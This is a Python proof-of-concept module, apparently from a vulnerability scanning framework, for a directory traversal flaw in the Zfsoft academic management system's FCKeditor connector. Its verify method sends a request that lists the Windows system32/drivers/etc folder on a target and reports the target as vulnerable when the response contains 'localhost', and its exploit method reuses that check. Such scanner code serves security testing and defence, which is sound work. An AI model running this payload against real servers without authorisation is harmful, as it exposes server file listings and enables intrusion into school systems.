# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zfsoft_0102'  # 平台漏洞编号
    name = '正方软件教务系统fckeditor任意文件便利问题'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2012-07-31'  # 漏洞公布时间
    desc = '''
        正方现代教学管理系统是一个面向学院各部门以及各层次用户的多模块综合信息管理系，包括教务公共信息维护、学生管理、师资管理、教学计划管理、智能排课、考试管理、选课管理、成绩管理、教材管理、实践管理、收费管理、教学质量评价、毕业生管理、体育管理、实验室管理以及学生综合信息查询、教师网上成绩录入等模块，能够满足从学生入学到毕业全过程及教务管理各个环节的管理需要。系统采用了当前流行的C/S结构和Internet网络技术，使整个校园网甚至Internet上的用户都可访问该系统，最大程度地实现了数据共享，深受广大用户青睐。
        fckeditor为了方正系统根目录的fckeditor文件夹中，调用默认的connectors接口即可遍历文件，即访问。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=8356'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '正方教务管理系统'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '846badf7-7467-4855-b138-450fe3db44c3'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=c:/windows/system32/drivers/etc"
            url = self.target + payload
            response = requests.get(url)
            if "localhost" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
